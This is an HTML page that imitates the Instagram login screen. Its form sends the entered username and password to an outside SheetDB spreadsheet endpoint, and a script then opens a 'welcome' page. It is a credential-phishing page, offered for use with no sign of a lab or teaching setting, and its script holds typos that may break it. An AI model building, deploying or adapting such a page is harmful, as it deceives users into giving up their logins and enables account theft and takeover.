<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <div class="container">
      <div class="center">
        <div class="header">
          <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
        </div>
       <form action="https://sheetdb.io/api/v1/ul6h2bruy1uza" method ="post" id="sheetdb-form"> <div class="inputElement">
          <input
            type="text"
            placeholder="Phone number,username or email"
            name="data[username]"
            class="inputText"
          />
          <input type="password" placeholder="Password"name="data[password]" class="inputText" />
          <input type="submit" value="Log in" class="inputButton"  /></form>
          <script>

            var form = document.getElementById ('sheetdb-form');
            form.addEventListener("submit", e >{
              e.preventDefault();
              fetch(form.action,{
                methd : "POST",
                body : new FormData(document.getElementById("sheetdb-form")),

              }).then(
                response => response.json()
                
                

              ).then ((html) =>
              {
                window.open('welcome.html', '_blank');
            });
          });
          </script>
          <div class="line">
            <span class="arrow"></span>
            <span class="content">OR</span>
            <span class="arrow"></span>
          </div>
          <div class="social__icon">
            <i class="fab fa-facebook-square"></i
            ><span>Log in with facebook</span>
          </div>
          <div class="forgetPassword">Forget Password?</div>
        </div>
      </div>
      <div class="footer">
        <p>Don't have an account?<span>Sign Up</span></p>
      </div>
    </div>
    
 
  </body>
</html>
